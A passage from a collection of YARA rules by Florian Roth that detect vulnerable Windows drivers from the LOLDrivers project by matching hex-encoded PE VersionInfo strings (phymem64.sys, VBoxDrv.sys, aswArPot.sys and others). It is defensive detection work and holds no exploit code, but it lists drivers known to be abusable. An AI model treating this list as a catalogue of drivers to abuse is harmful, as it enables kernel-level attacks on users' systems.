EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - phymem64.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 21:10:21\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]007000680079006d0065006d0020004100700070006c00690063006100740069006f006e } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]005300750070006500720020004d006900630072006f00200043006f006d00700075007400650072002c00200049006e0063002e } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0031002c00200030002c00200030002c00200030 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0031002c00200030002c00200030002c00200030 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]007000680079006d0065006d } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]007000680079006d0065006d } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]007000680079006d0065006d002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f007000790072006900670068007400280063002900200031003900390033002d00320030003100350020005300750070006500720020004d006900630072006f00200043006f006d00700075007400650072002c00200049006e0063002e } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Sysinternalswwwsysinternalscom_Procexpsys_Processexplorer_16A2_RID462E : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - procexp.Sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 04:07:31\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]00500072006f00630065007300730020004500780070006c006f007200650072 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]0053007900730069006e007400650072006e0061006c00730020002d0020007700770077002e0073007900730069006e007400650072006e0061006c0073002e0063006f006d } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]00310036002e00340032 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]00310036002e00340032 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]00700072006f0063006500780070002e007300790073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]00500072006f00630065007300730020004500780070006c006f007200650072 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]00700072006f0063006500780070002e005300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f007000790072006900670068007400200028004300290020004d00610072006b002000520075007300730069006e006f007600690063006800200031003900390036002d0032003000320031 } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Vektortsecurityservice_Vboxdrv_Antidetectpublic_CFB7_RID41AB : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - VBoxDrv.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 00:55:01\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]005600690072007400750061006c0042006f007800200053007500700070006f007200740020004400720069007600650072 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]00560065006b0074006f0072002000540031003300200053006500630075007200690074007900200053006500720076006900630065 } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0031002e0034002e0030002e003100310039003200330030 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0031002e0034002e0030002e003100310039003200330030 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]00560042006f0078004400720076 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]0041006e00740069006400650074006500630074002000320030003100390020005000750062006c00690063 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]00560042006f0078004400720076002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f0070007900720069006700680074002000280043002900200032003000300039002d00320030003100390020004f007200610063006c006500200043006f00720070006f0072006100740069006f006e } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 400KB and all of them\n}\n\nrule PUA_VULN_Driver_Sunmicrosystemsinc_Vboxdrvsys_Sunvirtualbox_R_C894_RID40ED : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - VBoxDrv.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 00:23:21\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]005600690072007400750061006c0042006f007800200053007500700070006f007200740020004400720069007600650072 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]00530075006e0020004d006900630072006f00730079007300740065006d0073002c00200049006e0063002e } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0032002e0032002e0034002e007200340037003900370038 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0032002e0032002e0034002e007200340037003900370038 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]00560042006f0078004400720076002e007300790073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]00530075006e0020005600690072007400750061006c0042006f0078 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]00560042006f0078004400720076002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f0070007900720069006700680074002000280043002900200032003000300039002000530075006e0020004d006900630072006f00730079007300740065006d0073002c00200049006e0063002e } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 200KB and all of them\n}\n\nrule PUA_VULN_Driver_Pinduoduoltdcorp_Vboxdrv_Pinduoduosecurevdi_9DAB_RID3FFD : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - VBoxDrv.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 23:43:21\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]005600690072007400750061006c0042006f007800200053007500700070006f007200740020004400720069007600650072 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]00500069006e00640075006f00640075006f0020004c0074006400200043006f00720070 } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0031002e0032002e0030002e003100330037003900300034 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0031002e0032002e0030002e003100330037003900300034 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]00560042006f0078004400720076 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]00500069006e00640075006f00640075006f00200053006500630075007200650020005600440049 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]00560042006f0078004400720076002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f0070007900720069006700680074002000280043002900200032003000310035002d0032003000320031002000500069006e00640075006f00640075006f00200043006f00720070006f0072006100740069006f006e } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 1000KB and all of them\n}\n\nrule PUA_VULN_Driver_Tgsoftsas_Viragtsys_Viritagentsystem_18DE_RID3D20 : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - viragt64.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 21:41:11\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]005600690072004900540020004100670065006e0074002000530079007300740065006d } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]0054004700200053006f0066007400200053002e0061002e0073002e } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0031002c00200030002c00200030002c00200030 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0031002c00200030002c00200030002c00200030 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]007600690072006100670074002e007300790073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]005600690072004900540020004100670065006e0074002000530079007300740065006d } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]00760069007200610067007400360034002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f0070007900720069006700680074002000280043002900200054004700200053006f0066007400200053002e0061002e0073002e00200032003000310031002c002000320030003100320020002d0020007700770077002e007400670073006f00660074002e00690074 } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Avgtechnologiesczsro_Aswarpotsys_Avginternetsecuritysystem_8CFD_RID468E : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - aswArPot.sys, avgArPot.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 04:23:31\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]00410056004700200061006e0074006900200072006f006f0074006b00690074 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]00410056004700200054006500630068006e006f006c006f006700690065007300200043005a002c00200073002e0072002e006f002e } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]00310039002e0037002e0034003200340036002e0030 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]00310039002e0037002e0034003200340036002e0030 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]006100730077004100720050006f0074002e007300790073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]00410056004700200049006e007400650072006e00650074002000530065006300750072006900740079002000530079007300740065006d0020 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]006100730077004100720050006f0074002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f0070007900720069006700680074002000280043002900200032003000310039002000410056004700200054006500630068006e006f006c006f006700690065007300200043005a002c00200073002e0072002e006f002e } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 300KB and all of them\n}\n\nrule PUA_VULN_Driver_Avastsoftware_Aswarpotsys_Avastantivirus_D5C4_RID3ED0 : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - aswArPot.sys, avgArPot.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 22:53:11\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]0041007600610073007400200061006e0074006900200072006f006f0074006b00690074 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]0041005600410053005400200053006f006600740077006100720065 } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]00310038002e0036002e0033003900370039002e0030 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]00310038002e0036002e0033003900370039002e0030 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]006100730077004100720050006f0074002e007300790073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]0041007600610073007400200041006e00740069007600690072007500730020 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]006100730077004100720050006f0074002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f007000790072006900670068007400200028006300290020003200300031003800200041005600410053005400200053006f006600740077006100720065 } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 200KB and all of them\n}\n\nrule PUA_VULN_Driver_Wj_Kprocesshacker_7021_RID34C6 : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - kprocesshacker.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 15:44:51\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]004b00500072006f0063006500730073004800610063006b00650072 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]0077006a00330032 } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0033002e0030 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0033002e0030 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]004b00500072006f0063006500730073004800610063006b00650072 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]006b00700072006f0063006500730073006800610063006b00650072002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]004c006900630065006e00730065006400200075006e006400650072002000740068006500200047004e0055002000470050004c002c002000760033002e } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Trendmicroinc_Tmcommsys_Trendmicroeyes_76E8_RID3DB6 : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - TmComm.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 22:06:11\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]005400720065006e0064004d006900630072006f00200043006f006d006d006f006e0020004d006f00640075006c0065 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]005400720065006e00640020004d006900630072006f00200049006e0063002e } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0036002e00320030002e0030002e0031003000300038 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0036002e00320030 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]0054006d0043006f006d006d002e007300790073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]005400720065006e00640020004d006900630072006f00200045007900650073 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]0054006d0043006f006d006d002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f00700079007200690067006800740020002800430029002000320030003100330020005400720065006e00640020004d006900630072006f00200049006e0063006f00720070006f00720061007400650064002e00200041006c006c0020007200690067006800740073002000720065007300650072007600650064002e } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 300KB and all of them\n}\n\nrule PUA_VULN_Driver_Elaboratebytesag_Elbycdio_Cdrtools_5148_RID3BA7 : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - elbycdio.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 20:38:21\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]0045006c0062007900430044002000570069006e0064006f007700730020004e0054002f0032003000300030002f0058005000200049002f004f0020006400720069007600650072 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]0045006c00610062006f0072006100740065002000420079007400650073002000410047 } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0034002c00200033002c00200030002c00200033 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0034002c00200033002c00200030002c00200030 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]0045006c00620079004300440049004f } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]0043004400520054006f006f006c0073 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]0045006c00620079004300440049004f002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f00700079007200690067006800740020002800430029002000320030003000300020002d0020003200300030003300200045006c00610062006f0072006100740065002000420079007400650073002000410047 } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Biostargroup_Iodriver_Biostariodriver_1D03_RID3D37 : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - BS_HWMIO64_W10.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 21:45:01\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]0049002f004f00200049006e00740065007200660061006300650020006400720069007600650072002000660069006c0065 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]00420049004f0053005400410052002000470072006f00750070 } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]00310030002c00200030002c00200031003800300036002c00200032003200300030 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]00310030002c00200030002c00200031003800300036002c00200032003200300030 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]0049002f004f0020006400720069007600650072 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]00420049004f005300540041005200200049002f004f0020006400720069007600650072 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]00420053005f00480057004d0049004f00360034005f005700310030002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f0070007900720069006700680074002000280063002900200032003000310038002d0032003000310039002000420049004f0053005400410052002000470072006f00750070 } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Avgtechnologiesczsro_Aswarpotsys_Avginternetsecuritysystem_E2E7_RID467C : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - aswArPot.sys, avgArPot.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 04:20:31\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]00410056004700200061006e0074006900200072006f006f0074006b00690074 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]00410056004700200054006500630068006e006f006c006f006700690065007300200043005a002c00200073002e0072002e006f002e } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]00310039002e0034002e0034003200310031002e0030 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]00310039002e0034002e0034003200310031002e0030 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]006100730077004100720050006f0074002e007300790073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]00410056004700200049006e007400650072006e00650074002000530065006300750072006900740079002000530079007300740065006d0020 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]006100730077004100720050006f0074002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f0070007900720069006700680074002000280043002900200032003000310039002000410056004700200054006500630068006e006f006c006f006700690065007300200043005a002c00200073002e0072002e006f002e } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 300KB and all of them\n}\n\nrule PUA_VULN_Driver_Windowsrwinddkprovider_Dcprotectsys_Dcprotectrwinxdriver_B224_RID4578 : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - DcProtect.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 03:37:11\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]0044006300500072006f00740065006300740020004400720069007600650072 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]00570069006e0064006f007700730020002800520029002000570069006e00200037002000440044004b002000700072006f00760069006400650072 } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0031002e0032002e0030002e0030 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0031002e0032002e0030002e0030 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]0044006300500072006f0074006500630074002e007300790073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]0044006300500072006f00740065006300740020002800520029002000570069006e0031003000780036003400200064007200690076006500720020 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]0044006300500072006f0074006500630074002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f0070007900720069006700680074002000280043002900200032003000310032002d00320030003200300020004a00690061006e0067006d0065006e0020004500790075006e0020004e006500740077006f0072006b00200043006f002e002c004c00740064002e00200032003000310039 } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Intelcorporation_Iqvwsys_Intelriqvwsys_5F69_RID3E12 : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - iQVW64.SYS\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 22:21:31\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]0049006e00740065006c0028005200290020004e006500740077006f0072006b0020004100640061007000740065007200200044006900610067006e006f00730074006900630020004400720069007600650072 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]0049006e00740065006c00200043006f00720070006f0072006100740069006f006e0020 } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0031002e00300033002e0032002e00370020006200750069006c0074002000620079003a002000570069006e00440044004b } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0031002e00300033002e0032002e0037 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]006900510056005700360034002e005300590053 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]0049006e00740065006c0028005200290020006900510056005700360034002e005300590053 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]006900510056005700360034002e005300590053 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f0070007900720069006700680074002000280043002900200032003000300032002d003200300031003600200049006e00740065006c00200043006f00720070006f0072006100740069006f006e00200041006c006c0020005200690067006800740073002000520065007300650072007600650064002e } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Avastsoftware_Ngiodriversys_Avastng_5E3B_RID3C87 : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - ngiodriver.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 21:15:41\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]0061007600610073007400210020004e0047002000730065007400750070002000680065006c0070006500720020006400720069007600650072 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]0041005600410053005400200053006f006600740077006100720065 } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]00310030002e0030002e0030002e00330033 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]00310030002e0030002e0030002e00330033 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]006e00670069006f006400720069007600650072002e007300790073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]004100760061007300740020004e0047 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]006e00670069006f006400720069007600650072002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f007000790072006900670068007400200028006300290020003200300031003400200041005600410053005400200053006f006600740077006100720065 } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Windowsrwinddkprovider_Dcprotectsys_Dcprotectrwinxdriver_9DEE_RID45A5 : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - DcProtect.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 03:44:41\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]0044006300500072006f00740065006300740020004400720069007600650072 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]00570069006e0064006f007700730020002800520029002000570069006e00200037002000440044004b002000700072006f00760069006400650072 } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0031002e0032002e0030002e0030 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0031002e0032002e0030002e0030 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]0044006300500072006f0074006500630074002e007300790073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]0044006300500072006f00740065006300740020002800520029002000570069006e0038002e003100780036003400200064007200690076006500720020 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]0044006300500072006f0074006500630074002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f0070007900720069006700680074002000280043002900200032003000310032002d00320030003200300020004a00690061006e0067006d0065006e0020004500790075006e0020004e006500740077006f0072006b00200043006f002e002c004c00740064002e00200032003000310039 } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Elaboratebytesag_Elbycdio_Cdrtools_9679_RID3BB4 : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - elbycdio.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 20:40:31\"\n   